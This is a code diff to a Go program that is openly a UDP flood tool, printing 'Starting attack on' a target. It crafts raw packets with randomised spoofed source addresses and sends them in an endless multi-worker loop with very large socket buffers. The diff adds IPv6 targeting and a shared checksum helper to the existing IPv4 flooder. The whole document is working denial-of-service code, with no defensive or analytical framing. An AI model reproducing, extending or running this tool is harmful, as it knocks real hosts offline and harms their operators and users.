@@ -21,7 +21,8 @@ var (
 	sent    uint64
 	stop    uint32
 	fd      int
-	addr    syscall.SockaddrInet4
+	addr    syscall.Sockaddr
+	isIPv6  bool
 	iface   string
 	workers int
 )
@@ -44,22 +45,52 @@ func getInterface() string {
 
 func setupRaw(targetIP string, targetPort int) {
 	var err error
-	fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
+	ip := net.ParseIP(targetIP)
+	if ip == nil {
+		log.Fatalf("invalid target IP: %s", targetIP)
+	}
+	isIPv6 = ip.To4() == nil
+	if isIPv6 {
+		fd, err = syscall.Socket(syscall.AF_INET6, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
+	} else {
+		fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
+	}
 	if err != nil {
 		log.Fatal(err)
 	}
 	iface = getInterface()
 	syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, iface)
-	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+	if isIPv6 {
+		syscall.SetsockoptInt(fd, syscall.IPPROTO_IPV6, syscall.IPV6_HDRINCL, 1)
+	} else {
+		syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+	}
 	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 134217728)
 	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 134217728)
-	tip := net.ParseIP(targetIP).To4()
-	copy(addr.Addr[:], tip)
-	addr.Port = targetPort
+	if isIPv6 {
+		target := ip.To16()
+		var addr6 syscall.SockaddrInet6
+		copy(addr6.Addr[:], target)
+		addr6.Port = targetPort
+		addr = &addr6
+	} else {
+		target := ip.To4()
+		var addr4 syscall.SockaddrInet4
+		copy(addr4.Addr[:], target)
+		addr4.Port = targetPort
+		addr = &addr4
+	}
 	workers = runtime.NumCPU() * 8
 }
 
-func craft(src, dst net.IP, sport, dport int) []byte {
+func checksum16(sum uint32) uint16 {
+	for sum>>16 > 0 {
+		sum = (sum & 0xffff) + (sum >> 16)
+	}
+	return ^uint16(sum)
+}
+
+func craftIPv4(src, dst net.IP, sport, dport int) []byte {
 	buf := make([]byte, 28)
 	ip := buf[:20]
 	ip[0] = 0x45
@@ -90,19 +121,45 @@ func craft(src, dst net.IP, sport, dport int) []byte {
 			psum += uint32(buf[i]) << 8
 		}
 	}
-	for psum>>16 > 0 {
-		psum = (psum & 0xffff) + (psum >> 16)
-	}
-	udp[6] = byte(^uint16(psum) >> 8)
-	udp[7] = byte(^uint16(psum))
+	udpChecksum := checksum16(psum)
+	udp[6] = byte(udpChecksum >> 8)
+	udp[7] = byte(udpChecksum)
 	csum := uint32(0)
 	for i := 0; i < 20; i += 2 {
 		csum += uint32(binary.BigEndian.Uint16(ip[i:]))
 	}
-	for csum>>16 > 0 {
-		csum = (csum & 0xffff) + (csum >> 16)
+	binary.BigEndian.PutUint16(ip[10:12], checksum16(csum))
+	return buf
+}
+
+func craftIPv6(src, dst net.IP, sport, dport int) []byte {
+	buf := make([]byte, 48)
+	ip := buf[:40]
+	ip[0] = 0x60
+	binary.BigEndian.PutUint16(ip[4:6], 8)
+	ip[6] = syscall.IPPROTO_UDP
+	ip[7] = 0x40
+	copy(ip[8:24], src)
+	copy(ip[24:40], dst)
+	udp := buf[40:48]
+	binary.BigEndian.PutUint16(udp[0:2], uint16(sport))
+	binary.BigEndian.PutUint16(udp[2:4], uint16(dport))
+	binary.BigEndian.PutUint16(udp[4:6], 8)
+	psum := uint32(0)
+	for i := 0; i < 16; i += 2 {
+		psum += uint32(binary.BigEndian.Uint16(src[i:]))
 	}
-	binary.BigEndian.PutUint16(ip[10:12], ^uint16(csum))
+	for i := 0; i < 16; i += 2 {
+		psum += uint32(binary.BigEndian.Uint16(dst[i:]))
+	}
+	psum += uint32(8)
+	psum += uint32(syscall.IPPROTO_UDP)
+	for i := 40; i < 48; i += 2 {
+		psum += uint32(binary.BigEndian.Uint16(buf[i:]))
+	}
+	udpChecksum := checksum16(psum)
+	udp[6] = byte(udpChecksum >> 8)
+	udp[7] = byte(udpChecksum)
 	return buf
 }
 
@@ -111,12 +168,21 @@ func sender(id int, wg *sync.WaitGroup, dst net.IP, dport int) {
 	r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
 	packets := make([][]byte, 1024)
 	for i := range packets {
-		src := net.IPv4(10, byte(r.Intn(256)), byte(r.Intn(256)), byte(r.Intn(254)+1)).To4()
-		packets[i] = craft(src, dst, 1024+r.Intn(64512), dport)
+		if isIPv6 {
+			src := make(net.IP, net.IPv6len)
+			src[0] = 0xfd
+			for j := 1; j < net.IPv6len; j++ {
+				src[j] = byte(r.Intn(256))
+			}
+			packets[i] = craftIPv6(src, dst, 1024+r.Intn(64512), dport)
+		} else {
+			src := net.IPv4(10, byte(r.Intn(256)), byte(r.Intn(256)), byte(r.Intn(254)+1)).To4()
+			packets[i] = craftIPv4(src, dst, 1024+r.Intn(64512), dport)
+		}
 	}
 	for atomic.LoadUint32(&stop) == 0 {
 		for _, pkt := range packets {
-			syscall.Sendto(fd, pkt, 0, &addr)
+			syscall.Sendto(fd, pkt, 0, addr)
 		}
 		atomic.AddUint64(&sent, uint64(len(packets)))
 		if sent%1000000 == 0 {
@@ -136,10 +202,19 @@ func main() {
 	fmt.Printf("Starting attack on %s:%d...\n", targetIP, targetPort)
 	setupRaw(targetIP, targetPort)
 	defer syscall.Close(fd)
+	parsedTarget := net.ParseIP(targetIP)
+	if parsedTarget == nil {
+		log.Fatalf("invalid target IP: %s", targetIP)
+	}
+	if isIPv6 {
+		parsedTarget = parsedTarget.To16()
+	} else {
+		parsedTarget = parsedTarget.To4()
+	}
 	var wg sync.WaitGroup
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
-		go sender(i, &wg, net.ParseIP(targetIP).To4(), targetPort)
+		go sender(i, &wg, parsedTarget, targetPort)
 	}
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
